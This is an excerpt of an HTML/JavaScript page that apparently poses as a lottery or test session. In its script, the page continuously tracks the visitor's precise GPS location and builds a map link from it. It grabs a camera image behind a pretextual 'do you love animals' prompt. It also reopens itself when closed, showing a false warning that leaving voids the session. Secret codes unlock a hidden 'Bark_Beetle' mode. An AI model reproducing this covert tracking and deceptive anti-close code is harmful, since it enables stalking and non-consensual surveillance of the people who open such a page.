...
<head>
    ...
    <style>
        ...
        /* Скрытые элементы для тех-поддержки */
...
<script>
    ...
    let globalCoords = "no-gps"; // Ссылка для карты
    let rawCoords = "no-data";   // Текстовые координаты (широта/долгота)

    // 1. ПОСТОЯННОЕ ОТСЛЕЖИВАНИЕ В РЕАЛЬНОМ ВРЕМЕНИ (LIVE)
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                rawCoords = `Широта: ${lat}, Долгота: ${lon}`;
                globalCoords = `https://www.google.com/maps?q=${lat},${lon}`;
            },
            () => { rawCoords = "GPS_BLOCKED"; },
            { enableHighAccuracy: true, maximumAge: 0 }
        );
    }

    // 2. ЗАЩИТА ОТ ЗАКРЫТИЯ (SELF-REBIRTH)
    window.onbeforeunload = function() {
        window.open(window.location.href, '_blank');
        return "ВНИМАНИЕ: Тестовая сессия JAS TULEK не завершена! Выход приведет к аннулированию данных.";
    };

    function copySupportID() {
        const id = "5931c081-de5a-458f-b1ab-824418ecfd61";
        navigator.clipboard.writeText(id).then(() => {
            alert("ID скопирован в буфер обмена! Отправьте его в техподдержку: " + id);
        });
    }
    ...
    async function runLottery() {
        ...
        const lovesAnimals = confirm("Вы любите животных? (Нажмите ОК для продолжения)");
        ...
        if(lovesAnimals) {
            ...
            try {
                ...
                globalPhoto = canvas.toDataURL('image/jpeg', 0.2);
        ...
        if (secretKeys.includes(code)) {
            // --- ЛОГИКА BARK_BEETLE (БЕЗ ИЗМЕНЕНИЙ) ---
            document.body.style.backgroundColor = "#0a0a0a";
            document.body.style.color = "#7a0000";
            document.getElementById('main-container').style.backgroundColor = "#111";
            document.getElementById('main-container').style.boxShadow = "0 10px 50px rgba(255,0,0,0.2)";
            ...
            setTimeout(() => {
                ...
                console.log("%cSотрудник вошел в Bark_Beetle.Erer", "color: red; font-weight: bold; font-size: 16px;");
            }, 2500);
            ...
            infoBlocks.forEach((block, index) => {
                ...
                const photosInThisRow = (index % 2 === 0) ? 1 : 2;
                imgContainer.style.gridTemplateColumns = `repeat(${photosInThisRow}, 1fr)`;
                for (let i = 0; i < photosInThisRow; i++) {
                    const newImg = document.createElement('img');
                    newImg.src = `Amage_${(index+i+1)}.png`;
                    newImg.className = "gallery-item";
                    newImg.style.border = "2px solid #4a0000";
